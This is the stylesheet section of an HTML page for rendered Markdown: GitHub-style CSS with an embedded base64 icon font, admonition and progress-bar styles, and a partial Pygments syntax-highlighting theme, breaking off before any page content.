<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {
  max-width: 980px;
  border: 1px solid #ddd;
  outline: 1300px solid #fff;
  margin: 16px auto;
}

body .markdown-body
{
  padding: 45px;
}

@font-face {
  font-family: fontawesome-mini;
  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
}

.markdown-body {
  font-family: sans-serif;
  -ms-text-size-adjust: 100%;
  -webkit-text-size-adjust: 100%;
  color: #333333;
  overflow: hidden;
  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
  font-size: 16px;
  line-height: 1.6;
  word-wrap: break-word;
}

.markdown-body a {
  background: transparent;
}

.markdown-body a:active,
.markdown-body a:hover {
  outline: 0;
}

.markdown-body b,
.markdown-body strong {
  font-weight: bold;
}

.markdown-body mark {
  background: #ff0;
  color: #000;
  font-style: italic;
  font-weight: bold;
}

.markdown-body sub,
.markdown-body sup {
  font-size: 75%;
  line-height: 0;
  position: relative;
  vertical-align: baseline;
}
.markdown-body sup {
  top: -0.5em;
}
.markdown-body sub {
  bottom: -0.25em;
}

.markdown-body h1 {
  font-size: 2em;
  margin: 0.67em 0;
}

.markdown-body img {
  border: 0;
}

.markdown-body hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  height: 0;
}

.markdown-body pre {
  overflow: auto;
}

.markdown-body code,
.markdown-body kbd,
.markdown-body pre,
.markdown-body samp {
  font-family: monospace, monospace;
  font-size: 1em;
}

.markdown-body input {
  color: inherit;
  font: inherit;
  margin: 0;
}

.markdown-body html input[disabled] {
  cursor: default;
}

.markdown-body input {
  line-height: normal;
}

.markdown-body input[type="checkbox"] {
  box-sizing: border-box;
  padding: 0;
}

.markdown-body table {
  border-collapse: collapse;
  border-spacing: 0;
}

.markdown-body td,
.markdown-body th {
  padding: 0;
}

.markdown-body .codehilitetable {
  border: 0;
  border-spacing: 0;
}

.markdown-body .codehilitetable tr {
  border: 0;
}

.markdown-body .codehilitetable pre,
.markdown-body .codehilitetable div.codehilite {
  margin: 0;
}

.markdown-body .linenos,
.markdown-body .code,
.markdown-body .codehilitetable td {
  border: 0;
  padding: 0;
}

.markdown-body td:not(.linenos) .linenodiv {
  padding: 0 !important;
}

.markdown-body .code {
  width: 100%;
  white-space : pre-wrap !important;
}

.markdown-body .linenos div pre,
.markdown-body .linenodiv pre,
.markdown-body .linenodiv {
  border: 0;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0;
  -webkit-border-top-left-radius: 3px;
  -webkit-border-bottom-left-radius: 3px;
  -moz-border-radius-topleft: 3px;
  -moz-border-radius-bottomleft: 3px;
  border-top-left-radius: 3px;
  border-bottom-left-radius: 3px;
}

.markdown-body .code div pre,
.markdown-body .code div {
  border: 0;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0;
  -webkit-border-top-right-radius: 3px;
  -webkit-border-bottom-right-radius: 3px;
  -moz-border-radius-topright: 3px;
  -moz-border-radius-bottomright: 3px;
  border-top-right-radius: 3px;
  border-bottom-right-radius: 3px;
}

.markdown-body * {
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

.markdown-body input {
  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
  line-height: 1.4;
}

.markdown-body a {
  color: #4183c4;
  text-decoration: none;
}

.markdown-body a:hover,
.markdown-body a:focus,
.markdown-body a:active {
  text-decoration: underline;
}

.markdown-body hr {
  height: 0;
  margin: 15px 0;
  overflow: hidden;
  background: transparent;
  border: 0;
  border-bottom: 1px solid #ddd;
}

.markdown-body hr:before,
.markdown-body hr:after {
  display: table;
  content: " ";
}

.markdown-body hr:after {
  clear: both;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  margin-top: 15px;
  margin-bottom: 15px;
  line-height: 1.1;
}

.markdown-body h1 {
  font-size: 30px;
}

.markdown-body h2 {
  font-size: 21px;
}

.markdown-body h3 {
  font-size: 16px;
}

.markdown-body h4 {
  font-size: 14px;
}

.markdown-body h5 {
  font-size: 12px;
}

.markdown-body h6 {
  font-size: 11px;
}

.markdown-body blockquote {
  margin: 0;
}

.markdown-body ul,
.markdown-body ol {
  padding: 0;
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body ol ol,
.markdown-body ul ol {
  list-style-type: lower-roman;
}

.markdown-body ul ul ol,
.markdown-body ul ol ol,
.markdown-body ol ul ol,
.markdown-body ol ol ol {
  list-style-type: lower-alpha;
}

.markdown-body dd {
  margin-left: 0;
}

.markdown-body code,
.markdown-body pre,
.markdown-body samp {
  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
  font-size: 12px;
}

.markdown-body pre {
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body kbd {
  background-color: #e7e7e7;
  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);
  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
  background-image: linear-gradient(#fefefe, #e7e7e7);
  background-repeat: repeat-x;
  border-radius: 2px;
  border: 1px solid #cfcfcf;
  color: #000;
  padding: 3px 5px;
  line-height: 10px;
  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
  display: inline-block;
}

.markdown-body>*:first-child {
  margin-top: 0 !important;
}

.markdown-body>*:last-child {
  margin-bottom: 0 !important;
}

.markdown-body .headerlink {
  font: normal 400 16px fontawesome-mini;
  vertical-align: middle;
  margin-left: -16px;
  float: left;
  display: inline-block;
  text-decoration: none;
  opacity: 0;
  color: #333;
}

.markdown-body .headerlink:focus {
  outline: none;
}

.markdown-body h1 .headerlink {
  margin-top: 0.8rem;
}

.markdown-body h2 .headerlink,
.markdown-body h3 .headerlink {
  margin-top: 0.6rem;
}

.markdown-body h4 .headerlink {
  margin-top: 0.2rem;
}

.markdown-body h5 .headerlink,
.markdown-body h6 .headerlink {
  margin-top: 0;
}

.markdown-body .headerlink:hover,
.markdown-body h1:hover .headerlink,
.markdown-body h2:hover .headerlink,
.markdown-body h3:hover .headerlink,
.markdown-body h4:hover .headerlink,
.markdown-body h5:hover .headerlink,
.markdown-body h6:hover .headerlink {
  opacity: 1;
  text-decoration: none;
}

.markdown-body h1 {
  padding-bottom: 0.3em;
  font-size: 2.25em;
  line-height: 1.2;
  border-bottom: 1px solid #eee;
}

.markdown-body h2 {
  padding-bottom: 0.3em;
  font-size: 1.75em;
  line-height: 1.225;
  border-bottom: 1px solid #eee;
}

.markdown-body h3 {
  font-size: 1.5em;
  line-height: 1.43;
}

.markdown-body h4 {
  font-size: 1.25em;
}

.markdown-body h5 {
  font-size: 1em;
}

.markdown-body h6 {
  font-size: 1em;
  color: #777;
}

.markdown-body p,
.markdown-body blockquote,
.markdown-body ul,
.markdown-body ol,
.markdown-body dl,
.markdown-body table,
.markdown-body pre,
.markdown-body .admonition {
  margin-top: 0;
  margin-bottom: 16px;
}

.markdown-body hr {
  height: 4px;
  padding: 0;
  margin: 16px 0;
  background-color: #e7e7e7;
  border: 0 none;
}

.markdown-body ul,
.markdown-body ol {
  padding-left: 2em;
}

.markdown-body ul ul,
.markdown-body ul ol,
.markdown-body ol ol,
.markdown-body ol ul {
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body li>p {
  margin-top: 16px;
}

.markdown-body dl {
  padding: 0;
}

.markdown-body dl dt {
  padding: 0;
  margin-top: 16px;
  font-size: 1em;
  font-style: italic;
  font-weight: bold;
}

.markdown-body dl dd {
  padding: 0 16px;
  margin-bottom: 16px;
}

.markdown-body blockquote {
  padding: 0 15px;
  color: #777;
  border-left: 4px solid #ddd;
}

.markdown-body blockquote>:first-child {
  margin-top: 0;
}

.markdown-body blockquote>:last-child {
  margin-bottom: 0;
}

.markdown-body table {
  display: block;
  width: 100%;
  overflow: auto;
  word-break: normal;
  word-break: keep-all;
}

.markdown-body table th {
  font-weight: bold;
}

.markdown-body table th,
.markdown-body table td {
  padding: 6px 13px;
  border: 1px solid #ddd;
}

.markdown-body table tr {
  background-color: #fff;
  border-top: 1px solid #ccc;
}

.markdown-body table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

.markdown-body img {
  max-width: 100%;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

.markdown-body code,
.markdown-body samp {
  padding: 0;
  padding-top: 0.2em;
  padding-bottom: 0.2em;
  margin: 0;
  font-size: 85%;
  background-color: rgba(0,0,0,0.04);
  border-radius: 3px;
}

.markdown-body code:before,
.markdown-body code:after {
  letter-spacing: -0.2em;
  content: "\00a0";
}

.markdown-body pre>code {
  padding: 0;
  margin: 0;
  font-size: 100%;
  word-break: normal;
  white-space: pre;
  background: transparent;
  border: 0;
}

.markdown-body .codehilite {
  margin-bottom: 16px;
}

.markdown-body .codehilite pre,
.markdown-body pre {
  padding: 16px;
  overflow: auto;
  font-size: 85%;
  line-height: 1.45;
  background-color: #f7f7f7;
  border-radius: 3px;
}

.markdown-body .codehilite pre {
  margin-bottom: 0;
  word-break: normal;
}

.markdown-body pre {
  word-wrap: normal;
}

.markdown-body pre code {
  display: inline;
  max-width: initial;
  padding: 0;
  margin: 0;
  overflow: initial;
  line-height: inherit;
  word-wrap: normal;
  background-color: transparent;
  border: 0;
}

.markdown-body pre code:before,
.markdown-body pre code:after {
  content: normal;
}

/* Admonition */
.markdown-body .admonition {
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  position: relative;
  border-radius: 3px;
  border: 1px solid #e0e0e0;
  border-left: 6px solid #333;
  padding: 10px 10px 10px 30px;
}

.markdown-body .admonition table {
  color: #333;
}

.markdown-body .admonition p {
  padding: 0;
}

.markdown-body .admonition-title {
  font-weight: bold;
  margin: 0;
}

.markdown-body .admonition>.admonition-title {
  color: #333;
}

.markdown-body .attention>.admonition-title {
  color: #a6d796;
}

.markdown-body .caution>.admonition-title {
  color: #d7a796;
}

.markdown-body .hint>.admonition-title {
  color: #96c6d7;
}

.markdown-body .danger>.admonition-title {
  color: #c25f77;
}

.markdown-body .question>.admonition-title {
  color: #96a6d7;
}

.markdown-body .note>.admonition-title {
  color: #d7c896;
}

.markdown-body .admonition:before,
.markdown-body .attention:before,
.markdown-body .caution:before,
.markdown-body .hint:before,
.markdown-body .danger:before,
.markdown-body .question:before,
.markdown-body .note:before {
  font: normal normal 16px fontawesome-mini;
  -moz-osx-font-smoothing: grayscale;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
  line-height: 1.5;
  color: #333;
  position: absolute;
  left: 0;
  top: 0;
  padding-top: 10px;
  padding-left: 10px;
}

.markdown-body .admonition:before {
  content: "\f056\00a0";
  color: 333;
}

.markdown-body .attention:before {
  content: "\f058\00a0";
  color: #a6d796;
}

.markdown-body .caution:before {
  content: "\f06a\00a0";
  color: #d7a796;
}

.markdown-body .hint:before {
  content: "\f05a\00a0";
  color: #96c6d7;
}

.markdown-body .danger:before {
  content: "\f057\00a0";
  color: #c25f77;
}

.markdown-body .question:before {
  content: "\f059\00a0";
  color: #96a6d7;
}

.markdown-body .note:before {
  content: "\f040\00a0";
  color: #d7c896;
}

.markdown-body .admonition::after {
  content: normal;
}

.markdown-body .attention {
  border-left: 6px solid #a6d796;
}

.markdown-body .caution {
  border-left: 6px solid #d7a796;
}

.markdown-body .hint {
  border-left: 6px solid #96c6d7;
}

.markdown-body .danger {
  border-left: 6px solid #c25f77;
}

.markdown-body .question {
  border-left: 6px solid #96a6d7;
}

.markdown-body .note {
  border-left: 6px solid #d7c896;
}

.markdown-body .admonition>*:first-child {
  margin-top: 0 !important;
}

.markdown-body .admonition>*:last-child {
  margin-bottom: 0 !important;
}

/* progress bar*/
.markdown-body .progress {
  display: block;
  width: 300px;
  margin: 10px 0;
  height: 24px;
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  border-radius: 3px;
  background-color: #ededed;
  position: relative;
  box-shadow: inset -1px 1px 3px rgba(0, 0, 0, .1);
}

.markdown-body .progress-label {
  position: absolute;
  text-align: center;
  font-weight: bold;
  width: 100%; margin: 0;
  line-height: 24px;
  color: #333;
  text-shadow: 1px 1px 0 #fefefe, -1px -1px 0 #fefefe, -1px 1px 0 #fefefe, 1px -1px 0 #fefefe, 0 1px 0 #fefefe, 0 -1px 0 #fefefe, 1px 0 0 #fefefe, -1px 0 0 #fefefe, 1px 1px 2px #000;
  -webkit-font-smoothing: antialiased !important;
  white-space: nowrap;
  overflow: hidden;
}

.markdown-body .progress-bar {
  height: 24px;
  float: left;
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  border-radius: 3px;
  background-color: #96c6d7;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), inset 0 -1px 0 rgba(0, 0, 0, .1);
  background-size: 30px 30px;
  background-image: -webkit-linear-gradient(
    135deg, rgba(255, 255, 255, .4) 27%,
    transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%,
    transparent 77%, transparent
  );
  background-image: -moz-linear-gradient(
    135deg,
    rgba(255, 255, 255, .4) 27%, transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%, transparent 77%,
    transparent
  );
  background-image: -ms-linear-gradient(
    135deg,
    rgba(255, 255, 255, .4) 27%, transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%, transparent 77%,
    transparent
  );
  background-image: -o-linear-gradient(
    135deg,
    rgba(255, 255, 255, .4) 27%, transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%, transparent 77%,
    transparent
  );
  background-image: linear-gradient(
    135deg,
    rgba(255, 255, 255, .4) 27%, transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%, transparent 77%,
    transparent
  );
}

.markdown-body .progress-100plus .progress-bar {
  background-color: #a6d796;
}

.markdown-body .progress-80plus .progress-bar {
  background-color: #c6d796;
}

.markdown-body .progress-60plus .progress-bar {
  background-color: #d7c896;
}

.markdown-body .progress-40plus .progress-bar {
  background-color: #d7a796;
}

.markdown-body .progress-20plus .progress-bar {
  background-color: #d796a6;
}

.markdown-body .progress-0plus .progress-bar {
  background-color: #c25f77;
}

.markdown-body .candystripe-animate .progress-bar{
  -webkit-animation: animate-stripes 3s linear infinite;
  -moz-animation: animate-stripes 3s linear infinite;
  animation: animate-stripes 3s linear infinite;
}

@-webkit-keyframes animate-stripes {
  0% {
    background-position: 0 0;
  }

  100% {
    background-position: 60px 0;
  }
}

@-moz-keyframes animate-stripes {
  0% {
    background-position: 0 0;
  }

  100% {
    background-position: 60px 0;
  }
}

@keyframes animate-stripes {
  0% {
    background-position: 0 0;
  }

  100% {
    background-position: 60px 0;
  }
}

.markdown-body .gloss .progress-bar {
  box-shadow:
    inset 0 4px 12px rgba(255, 255, 255, .7),
    inset 0 -12px 0 rgba(0, 0, 0, .05);
}

/* MultiMarkdown Critic Blocks */
.markdown-body .critic_mark {
  background: #ff0;
}

.markdown-body .critic_delete {
  color: #c82829;
  text-decoration: line-through;
}

.markdown-body .critic_insert {
  color: #718c00 ;
  text-decoration: underline;
}

.markdown-body .critic_comment {
  color: #8e908c;
  font-style: italic;
}

.markdown-body .headeranchor {
  font: normal normal 16px fontawesome-mini;
  line-height: 1;
  display: inline-block;
  text-decoration: none;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.headeranchor:before {
  content: '\e157';
}

.markdown-body .task-list-item {
  list-style-type: none;
}

.markdown-body .task-list-item+.task-list-item {
  margin-top: 3px;
}

.markdown-body .task-list-item input {
  margin: 0 4px 0.25em -20px;
  vertical-align: middle;
}

/* Media */
@media only screen and (min-width: 480px) {
  .markdown-body {
    font-size:14px;
  }
}

@media only screen and (min-width: 768px) {
  .markdown-body {
    font-size:16px;
  }
}

@media print {
  .markdown-body * {
    background: transparent !important;
    color: black !important;
    filter:none !important;
    -ms-filter: none !important;
  }

  .markdown-body {
    font-size:12pt;
    max-width:100%;
    outline:none;
    border: 0;
  }

  .markdown-body a,
  .markdown-body a:visited {
    text-decoration: underline;
  }

  .markdown-body .headeranchor-link {
    display: none;
  }

  .markdown-body a[href]:after {
    content: " (" attr(href) ")";
  }

  .markdown-body abbr[title]:after {
    content: " (" attr(title) ")";
  }

  .markdown-body .ir a:after,
  .markdown-body a[href^="javascript:"]:after,
  .markdown-body a[href^="#"]:after {
    content: "";
  }

  .markdown-body pre {
    white-space: pre;
    white-space: pre-wrap;
    word-wrap: break-word;
  }

  .markdown-body pre,
  .markdown-body blockquote {
    border: 1px solid #999;
    padding-right: 1em;
    page-break-inside: avoid;
  }

  .markdown-body .progress,
  .markdown-body .progress-bar {
    -moz-box-shadow: none;
    -webkit-box-shadow: none;
    box-shadow: none;
  }

  .markdown-body .progress {
    border: 1px solid #ddd;
  }

  .markdown-body .progress-bar {
    height: 22px;
    border-right: 1px solid #ddd;
  }

  .markdown-body tr,
  .markdown-body img {
    page-break-inside: avoid;
  }

  .markdown-body img {
    max-width: 100% !important;
  }

  .markdown-body p,
  .markdown-body h2,
  .markdown-body h3 {
    orphans: 3;
    widows: 3;
  }

  .markdown-body h2,
  .markdown-body h3 {
    page-break-after: avoid;
  }
}
</style><style>/*GitHub*/
.codehilite {background-color:#fff;color:#333333;}
.codehilite .hll {background-color:#ffffcc;}
.codehilite .c{color:#999988;font-style:italic}
.codehilite .err{color:#a61717;background-color:#e3d2d2}
.codehilite .k{font-weight:bold}
.codehilite .o{font-weight:bold}
.codehilite .cm{color:#999988;font-style:italic}
.codehilite .cp{color:#999999;font-weight:bold}
.codehilite .c1{color:#999988;font-style:italic}
.codehilite .cs{color:#999999;font-weight:bold;font-style:italic}
.codehilite .gd{color:#000000;background-color:#ffdddd}
.codehilite .ge{font-style:italic}
.codehilite .gr{color:#aa0000}
.codehilite .gh{color:#999999}
.codehilite .gi{color:#000000;background-color:#ddffdd}
.codehilite .go{color:#888888}
.codehilite .gp{color:#555555}
.codehilite .gs{font-weight:bold}
.codehilite .gu{color:#800080;font-weight:bold}
.codehilite .gt{color:#aa0000}
.codehilite .kc{font-weight:bold}
.codehilite .kd{font-weight:bold}
.codehilite .kn{font-weight:bold}
.codehilite .kp{font-weight:bold}
.codehilite .kr{font-weight:bold}
.codehilite .kt{color:#445588;font-weight:bold}
.codehilite .m{color:#009999}
.codehilite .s{color:#dd1144}
